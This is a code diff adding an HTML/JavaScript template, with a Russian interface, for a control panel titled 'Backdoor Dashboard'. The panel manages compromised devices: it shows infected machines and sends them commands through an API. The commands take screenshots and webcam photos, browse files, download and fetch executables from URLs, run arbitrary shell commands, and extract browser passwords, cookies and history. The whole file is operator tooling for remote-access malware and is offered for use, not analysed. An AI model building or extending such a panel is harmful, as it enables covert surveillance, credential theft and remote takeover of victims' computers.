@@ -1,0 +1,498 @@
+{% extends "base.html" %}
+
+{% block title %}Панель управления - Backdoor Dashboard{% endblock %}
+
+{% block content %}
+<div class="row">
+    <!-- Статистика -->
+    <div class="col-xl-3 col-md-6 mb-4">
+        <div class="card stats-card h-100">
+            <div class="card-body text-center">
+                <i class="fas fa-desktop fa-3x mb-3"></i>
+                <div class="stats-number" id="total-devices">0</div>
+                <div>Всего устройств</div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-xl-3 col-md-6 mb-4">
+        <div class="card stats-card h-100">
+            <div class="card-body text-center">
+                <i class="fas fa-wifi fa-3x mb-3"></i>
+                <div class="stats-number" id="active-devices">0</div>
+                <div>Активных устройств</div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-xl-3 col-md-6 mb-4">
+        <div class="card stats-card h-100">
+            <div class="card-body text-center">
+                <i class="fas fa-terminal fa-3x mb-3"></i>
+                <div class="stats-number" id="total-commands">0</div>
+                <div>Выполнено команд</div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-xl-3 col-md-6 mb-4">
+        <div class="card stats-card h-100">
+            <div class="card-body text-center">
+                <i class="fas fa-check-circle fa-3x mb-3"></i>
+                <div class="stats-number" id="success-rate">0%</div>
+                <div>Успешность команд</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <!-- Быстрые команды -->
+    <div class="col-lg-8 mb-4">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-bolt me-2"></i>
+                    Быстрые команды
+                </h5>
+            </div>
+            <div class="card-body">
+                <div class="row mb-3">
+                    <div class="col-md-6">
+                        <label for="device-select" class="form-label">Выберите устройство:</label>
+                        <select class="form-select" id="device-select">
+                            <option value="">Выберите устройство...</option>
+                        </select>
+                    </div>
+                    <div class="col-md-6">
+                        <label for="command-type" class="form-label">Тип команды:</label>
+                        <select class="form-select" id="command-type">
+                            <option value="">Выберите тип...</option>
+                            <option value="system">Системная информация</option>
+                            <option value="screenshot">Скриншот экрана</option>
+                            <option value="webcam">Фото с веб-камеры</option>
+                            <option value="processes">Список процессов</option>
+                            <option value="files">Просмотр файлов</option>
+                            <option value="download">Скачать файл</option>
+                            <option value="browser">Данные браузера</option>
+                            <option value="custom">Пользовательская команда</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div id="command-options" style="display: none;">
+                    <!-- Опции для разных типов команд -->
+                </div>
+                
+                <div class="mb-3">
+                    <label for="custom-command" class="form-label">Пользовательская команда:</label>
+                    <div class="input-group">
+                        <input type="text" class="form-control command-input" id="custom-command" 
+                               placeholder="Введите команду (например: dir, ipconfig, whoami)">
+                        <button class="btn btn-primary" type="button" id="execute-btn">
+                            <i class="fas fa-play me-2"></i>Выполнить
+                        </button>
+                    </div>
+                    <div class="form-text">
+                        <strong>Доступные команды:</strong><br>
+                        <code>system</code> - Системная информация | 
+                        <code>screenshot</code> - Скриншот | 
+                        <code>webcam</code> - Фото с камеры | 
+                        <code>processes</code> - Процессы | 
+                        <code>files [путь]</code> - Просмотр файлов | 
+                        <code>download [URL]</code> - Скачать файл | 
+                        <code>browser [тип]</code> - Данные браузера
+                    </div>
+                </div>
+                
+                <div id="command-result" style="display: none;">
+                    <div class="alert alert-info">
+                        <h6><i class="fas fa-info-circle me-2"></i>Результат выполнения:</h6>
+                        <pre id="result-text" class="mb-0"></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Последние устройства -->
+    <div class="col-lg-4 mb-4">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-clock me-2"></i>
+                    Последние устройства
+                </h5>
+            </div>
+            <div class="card-body">
+                <div id="recent-devices">
+                    <div class="text-center text-muted">
+                        <i class="fas fa-spinner fa-spin fa-2x mb-2"></i>
+                        <p>Загрузка устройств...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <!-- График активности -->
+    <div class="col-lg-8 mb-4">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-chart-line me-2"></i>
+                    Активность за последние 7 дней
+                </h5>
+            </div>
+            <div class="card-body">
+                <canvas id="activity-chart" height="100"></canvas>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Последние команды -->
+    <div class="col-lg-4 mb-4">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-history me-2"></i>
+                    Последние команды
+                </h5>
+            </div>
+            <div class="card-body">
+                <div id="recent-commands">
+                    <div class="text-center text-muted">
+                        <i class="fas fa-spinner fa-spin fa-2x mb-2"></i>
+                        <p>Загрузка команд...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    let activityChart = null;
+    
+    // Загрузка дашборда
+    function loadDashboard() {
+        document.getElementById('page-title').textContent = 'Панель управления';
+        loadAnalytics();
+        loadDevices();
+        loadRecentCommands();
+    }
+    
+    // Загрузка аналитики
+    async function loadAnalytics() {
+        try {
+            const response = await fetch('/api/analytics');
+            const data = await response.json();
+            
+            // Обновляем статистику
+            document.getElementById('total-devices').textContent = data.devices.total;
+            document.getElementById('active-devices').textContent = data.devices.active;
+            document.getElementById('total-commands').textContent = data.commands.total;
+            
+            const successRate = data.commands.total > 0 
+                ? Math.round((data.commands.successful / data.commands.total) * 100)
+                : 0;
+            document.getElementById('success-rate').textContent = successRate + '%';
+            
+            // Обновляем график
+            updateActivityChart(data.daily_activity);
+            
+        } catch (error) {
+            console.error('Error loading analytics:', error);
+            showToast('Ошибка загрузки аналитики', 'error');
+        }
+    }
+    
+    // Обновление графика активности
+    function updateActivityChart(dailyActivity) {
+        const ctx = document.getElementById('activity-chart').getContext('2d');
+        
+        if (activityChart) {
+            activityChart.destroy();
+        }
+        
+        const labels = dailyActivity.map(item => item.date);
+        const data = dailyActivity.map(item => item.count);
+        
+        activityChart = new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: labels,
+                datasets: [{
+                    label: 'Команды',
+                    data: data,
+                    borderColor: '#667eea',
+                    backgroundColor: 'rgba(102, 126, 234, 0.1)',
+                    tension: 0.4,
+                    fill: true
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: {
+                    legend: {
+                        display: false
+                    }
+                },
+                scales: {
+                    y: {
+                        beginAtZero: true,
+                        ticks: {
+                            stepSize: 1
+                        }
+                    }
+                }
+            }
+        });
+    }
+    
+    // Загрузка устройств
+    async function loadDevices() {
+        try {
+            const response = await fetch('/api/devices');
+            devices = await response.json();
+            
+            // Обновляем список устройств
+            updateDeviceSelect();
+            updateRecentDevices();
+            
+        } catch (error) {
+            console.error('Error loading devices:', error);
+            showToast('Ошибка загрузки устройств', 'error');
+        }
+    }
+    
+    // Обновление выпадающего списка устройств
+    function updateDeviceSelect() {
+        const select = document.getElementById('device-select');
+        select.innerHTML = '<option value="">Выберите устройство...</option>';
+        
+        devices.forEach(device => {
+            const option = document.createElement('option');
+            option.value = device.id;
+            option.textContent = `${device.name} (${device.platform}) - ${device.status}`;
+            select.appendChild(option);
+        });
+    }
+    
+    // Обновление списка последних устройств
+    function updateRecentDevices() {
+        const container = document.getElementById('recent-devices');
+        
+        if (devices.length === 0) {
+            container.innerHTML = '<div class="text-center text-muted"><p>Устройства не найдены</p></div>';
+            return;
+        }
+        
+        const recentDevices = devices.slice(0, 5);
+        container.innerHTML = recentDevices.map(device => `
+            <div class="d-flex align-items-center mb-3">
+                <div class="flex-shrink-0">
+                    <i class="fas fa-desktop fa-2x ${device.status === 'online' ? 'text-success' : 'text-muted'}"></i>
+                </div>
+                <div class="flex-grow-1 ms-3">
+                    <h6 class="mb-0">${device.name}</h6>
+                    <small class="text-muted">
+                        ${device.platform} • ${getStatusBadge(device.status)}
+                    </small>
+                    <br>
+                    <small class="text-muted">
+                        Последняя активность: ${formatDate(device.last_seen)}
+                    </small>
+                </div>
+            </div>
+        `).join('');
+    }
+    
+    // Загрузка последних команд
+    async function loadRecentCommands() {
+        try {
+            const response = await fetch('/api/commands/recent');
+            const commands = await response.json();
+            
+            const container = document.getElementById('recent-commands');
+            
+            if (commands.length === 0) {
+                container.innerHTML = '<div class="text-center text-muted"><p>Команды не найдены</p></div>';
+                return;
+            }
+            
+            container.innerHTML = commands.slice(0, 5).map(command => `
+                <div class="command-item command-${command.status}">
+                    <div class="d-flex justify-content-between align-items-start">
+                        <div>
+                            <strong>${command.command}</strong>
+                            <br>
+                            <small class="text-muted">${command.device_id}</small>
+                        </div>
+                        <small class="text-muted">${formatDate(command.executed_at)}</small>
+                    </div>
+                </div>
+            `).join('');
+            
+        } catch (error) {
+            console.error('Error loading commands:', error);
+        }
+    }
+    
+    // Обработка выбора типа команды
+    document.getElementById('command-type').addEventListener('change', function() {
+        const commandType = this.value;
+        const optionsContainer = document.getElementById('command-options');
+        
+        if (!commandType) {
+            optionsContainer.style.display = 'none';
+            return;
+        }
+        
+        let optionsHtml = '';
+        
+        switch(commandType) {
+            case 'files':
+                optionsHtml = `
+                    <div class="mb-3">
+                        <label for="file-path" class="form-label">Путь к папке:</label>
+                        <input type="text" class="form-control" id="file-path" 
+                               placeholder="C:\\Users\\Username\\Desktop" value="C:\\Users">
+                    </div>
+                `;
+                break;
+            case 'download':
+                optionsHtml = `
+                    <div class="mb-3">
+                        <label for="download-url" class="form-label">URL файла:</label>
+                        <input type="url" class="form-control" id="download-url" 
+                               placeholder="https://example.com/file.exe">
+                    </div>
+                `;
+                break;
+            case 'browser':
+                optionsHtml = `
+                    <div class="mb-3">
+                        <label for="browser-type" class="form-label">Тип данных:</label>
+                        <select class="form-select" id="browser-type">
+                            <option value="all">Все данные</option>
+                            <option value="passwords">Пароли</option>
+                            <option value="cookies">Куки</option>
+                            <option value="history">История</option>
+                        </select>
+                    </div>
+                `;
+                break;
+        }
+        
+        optionsContainer.innerHTML = optionsHtml;
+        optionsContainer.style.display = optionsHtml ? 'block' : 'none';
+    });
+    
+    // Выполнение команды
+    document.getElementById('execute-btn').addEventListener('click', async function() {
+        const deviceId = document.getElementById('device-select').value;
+        const commandType = document.getElementById('command-type').value;
+        const customCommand = document.getElementById('custom-command').value.trim();
+        
+        if (!deviceId) {
+            showToast('Выберите устройство', 'error');
+            return;
+        }
+        
+        let command = '';
+        
+        if (commandType === 'custom') {
+            if (!customCommand) {
+                showToast('Введите команду', 'error');
+                return;
+            }
+            command = customCommand;
+        } else {
+            // Формируем команду на основе типа
+            switch(commandType) {
+                case 'system':
+                    command = '/system_info';
+                    break;
+                case 'screenshot':
+                    command = '/screenshot';
+                    break;
+                case 'webcam':
+                    command = '/webcam';
+                    break;
+                case 'processes':
+                    command = '/processes';
+                    break;
+                case 'files':
+                    const filePath = document.getElementById('file-path')?.value || 'C:\\Users';
+                    command = `/browse_files ${filePath}`;
+                    break;
+                case 'download':
+                    const downloadUrl = document.getElementById('download-url')?.value;
+                    if (!downloadUrl) {
+                        showToast('Введите URL для скачивания', 'error');
+                        return;
+                    }
+                    command = `/download ${downloadUrl}`;
+                    break;
+                case 'browser':
+                    const browserType = document.getElementById('browser-type')?.value || 'all';
+                    command = `/browser_data ${browserType}`;
+                    break;
+                default:
+                    showToast('Выберите тип команды', 'error');
+                    return;
+            }
+        }
+        
+        // Выполняем команду
+        try {
+            this.disabled = true;
+            this.innerHTML = '<span class="loading"></span> Выполняется...';
+            
+            const response = await fetch('/api/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    device_id: deviceId,
+                    command: command
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (result.success) {
+                showToast('Команда отправлена', 'success');
+                document.getElementById('command-result').style.display = 'block';
+                document.getElementById('result-text').textContent = 'Команда выполняется...';
+            } else {
+                showToast('Ошибка отправки команды', 'error');
+            }
+            
+        } catch (error) {
+            console.error('Error executing command:', error);
+            showToast('Ошибка выполнения команды', 'error');
+        } finally {
+            this.disabled = false;
+            this.innerHTML = '<i class="fas fa-play me-2"></i>Выполнить';
+        }
+    });
+    
+    // Обработка результатов команд через WebSocket
+    socket.on('command_completed', (data) => {
+        document.getElementById('command-result').style.display = 'block';
+        document.getElementById('result-text').textContent = data.result || 'Команда выполнена';
+        
+        // Обновляем статистику
+        loadAnalytics();
+        loadRecentCommands();
+    });
+</script>
+{% endblock %}
